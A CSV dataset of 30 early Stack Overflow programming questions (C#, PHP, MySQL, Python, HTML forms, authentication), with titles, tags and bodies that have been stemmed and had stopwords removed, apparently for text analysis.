,DId,DTitle,DBody,DTags
0,9,How do I calculate someone's age based on a DateTime type birthday?,"given datetim repres person' birthday, calcul age years?",<c#><.net><datetime>
1,11,Calculate relative time in C#,"given specif datetim value, display rel time, like: 2 hour ago 3 day ago month ago",<c#><datetime><time><datediff><relative-time-span>
2,4,How to convert a Decimal to a Double in C#?,"want use track-bar chang form' opacity. code: decim tran = trackbar1.valu / 5000; this.opac = trans; build application, give follow error: cannot implicitli convert type decim doubl tri use tran double, control work. code work fine past vb.net project.",<c#><floating-point><type-conversion><double><decimal>
3,13,Determine a user's timezone,standard way web server abl determin user' timezon within web page? perhap http header part user-ag string?,<html><browser><timezone><user-agent><timezone-offset>
4,371,How do you make sure email you send programmatically is not automatically marked as spam?,"tricki one i'v alway reli techniques, permission-bas email (i.e. send peopl permiss send to) use blatantli spamish terminology. late, email send programmat start shuffl people' spam folder automat i'm wonder it. despit fact particular email one human would mark spam, specifically, email contain licens key peopl paid good money for, think they'r go consid spam figur big topic essenti ignor simpleton.",<email><email-spam>
5,17,Binary Data in MySQL,store binari data mysql?,<mysql><database><binary-data><data-storage>
6,227,What's the best way to generate a tag cloud from an array using h1 through h6 for sizing?,"follow arrays: $artist = array(""th roots"", ""michael jackson"", ""billi idol"", ""more"", ""and more"", ""and_yet_more""); $count = array(5, 3, 9, 1, 1, 3); want gener tag cloud artist higher number $count enclos h6 tag lowest enclos h1 tags.",<php><arrays><tag-cloud>
7,14,Difference between Math.Floor() and Math.Truncate(),differ math.floor() math.truncate() .net?,<.net><math>
8,289,How do you sort a dictionary by value?,"often sort dictionary, consist key & values, value. example, hash word respect frequencies, want order frequency. sortedlist good singl valu (say frequency), want map back word. sorteddictionari order key, value. resort custom class, cleaner way?",<c#><.net><sorting><dictionary>
9,180,Function for creating color wheels,"someth i'v pseudo-solv mani time never quit found solut for. problem come way gener n colors, distinguish possibl n parameter.",<algorithm><language-agnostic><colors><color-space>
10,24,Throw an error preventing a table update in a MySQL trigger,"trigger updat table, throw error prevent updat table?",<mysql><database><triggers>
11,48,Multiple submit buttons in an HTML form,"let' say creat wizard html form. one button goe back, one goe forward. sinc back button appear first markup press enter, use button submit form. example: <form> <!-- put cursor field press enter --> <input type=""text"" name=""field1"" /> <!-- button submit --> <input type=""submit"" name=""prev"" value=""previ page"" /> <!-- button want submit --> <input type=""submit"" name=""next"" value=""next page"" /> </form> would like get decid button use submit form user press enter. way, press enter wizard move next page, previous. use tabindex this?",<html><forms><form-submit><submit-button>
12,336,When to use unsigned values over signed ones?,"appropri use unsign variabl sign one? loop? hear lot opinion want see anyth resembl consensus. (unsign int = 0; < something.length(); i++) { someth var = something.at(i); // get idea. } know java unsign values, must conciou decis sun microsystems' part.",<language-agnostic><types>
13,260,Adding scripting functionality to .NET applications,"littl game written c#. use databas back-end. trade card game, want implement function card script. mean essenti interface, icard, card class implement (public class card056: icard) contain function call game. now, make thing maintainable/moddable, would like class card sourc code databas essenti compil first use. add/chang card, i'll add databas tell applic refresh, without need assembl deploy (especi sinc would talk 1 assembl per card mean hundr assemblies). possible? regist class sourc file instanti it, etc. icard cards[current] = new mygame.cardlibrary.card056(); cards[current].onenterplay(ref currentgamestate); languag c# extra bonu possibl write script .net language.",<c#><.net><scripting><compiler-construction>
14,328,PHP Session Security,guidelin maintain respons session secur php? there' inform web time land one place!,<security><php>
15,361,Generate list of all possible permutations of a string,"would go gener list possibl permut string x charact length, contain variabl list characters. languag would work, portable.",<string><language-agnostic><cross-platform>
16,90,How do you branch and merge with TortoiseSVN?,branch merg apach subvers use tortoisesvn client?,<svn><tortoisesvn><branch><branching-and-merging>
17,564,What is the difference between an int and an Integer in Java and C#?,"read joel softwar came across joel spolski say someth particular type programm know differ int integ java/c# (object-ori program languages). so, difference?",<c#><java><integer><int>
18,609,Build for Windows NT 4.0 using Visual Studio 2005?,"mfc applic i'm tri migrat use afxext.h, caus _afxdll get set, caus error set /mt: pleas use /md switch _afxdll build research date indic imposs build applic execut window nt 4.0 use visual studio (c++, case) 2005. realli true? workaround available?",<c++><visual-studio><compatibility><windows-nt>
19,626,"When to use lambda, when to use Proc.new?","rubi 1.8, subtl differ proc/lambda one hand, proc.new other. differences? give guidelin decid one choose? rubi 1.9, proc lambda different. what' deal?",<ruby><lambda><proc>
20,752,How to create a new object instance from a Type,"one may alway know type object compile-time, may need creat instanc type. get new object instanc type?",<c#><.net><performance><reflection><types>
21,773,How do I use itertools.groupby()?,"abl find understand explan actual use python' itertools.groupby() function. i'm tri this: take list - case, children objectifi lxml element divid group base criteria later iter group separately. i'v review documentation, i'v troubl tri appli beyond simpl list numbers. so, use itertools.groupby()? anoth techniqu using? pointer good ""prerequisite"" read would also appreciated.",<python><itertools>
22,972,Adding a Method to an Existing Object Instance,"i'v read possibl add method exist object (i.e., class definition) python. understand alway good so. might one this?",<python><oop><methods><monkeypatching>
23,1108,How does database indexing work?,"given index import data set increas size, someon explain index work database-agnost level? inform queri index field, check index databas column.",<sql><database><performance><indexing><database-indexes>
24,549,The definitive guide to form-based website authentication,"form-bas authent websit believ stack overflow resourc specif technic questions, also gener guidelin solv variat common problems. ""form base authent websites"" fine topic experiment. includ topic as: log log remain log manag cooki (includ recommend settings) ssl/http encrypt store password use secret question forgotten username/password function use nonc prevent cross-sit request forgeri (csrf) openid ""rememb me"" checkbox browser autocomplet usernam password secret url (public url protect digest) check password strength e-mail valid much form base authentication... includ thing like: role author http basic authent pleas help us by: suggest subtop submit good articl subject edit offici answer",<security><http><authentication><language-agnostic><article>
25,1304,How to check for file lock?,"way check whether file lock without use try/catch block? right now, way know open file catch system.io.ioexception.",<c#><.net><io><filelock>
26,879,Are PHP Variables passed by value or by reference?,php variabl pass valu reference?,<php><variables><pass-by-reference><pass-by-value>
27,2384,Read binary file into a struct,"i'm tri read binari data use c#. inform layout data file want read. i'm abl read data ""chunk chunk"", i.e. get first 40 byte data convert string, get next 40 bytes. sinc least three slightli differ version data, would like read data directli struct. feel much right read ""line line"". tri follow approach avail: structtyp astruct; int count = marshal.sizeof(typeof(structtype)); byte[] readbuff = new byte[count]; binaryread reader = new binaryreader(stream); readbuff = reader.readbytes(count); gchandl handl = gchandle.alloc(readbuffer, gchandletype.pinned); astruct = (structtype) marshal.ptrtostructure(handle.addrofpinnedobject(), typeof(structtype)); handle.free(); stream open filestream began read from. get accessviolationexcept use marshal.ptrtostructure. stream contain inform i'm tri read sinc i'm interest data end file. struct defin like: [structlayout(layoutkind.explicit)] struct structtyp { [fieldoffset(0)] public string filedate; [fieldoffset(8)] public string filetime; [fieldoffset(16)] public int id1; [fieldoffset(20)] public string id2; } exampl code chang origin make question shorter. would read binari data file struct?",<c#><struct><io><binaryfiles>
28,2530,How do you disable browser autocomplete on web form field / input tags?,disabl autocomplet major browser specif input (or form field)?,<html><forms><browser><autocomplete>
29,888,How do you debug PHP scripts?,debug php scripts? awar basic debug use error reporting. breakpoint debug phpeclips also quit useful. best (in term fast easy) way debug phpstorm ide?,<php><eclipse><debugging><phpstorm><xdebug>
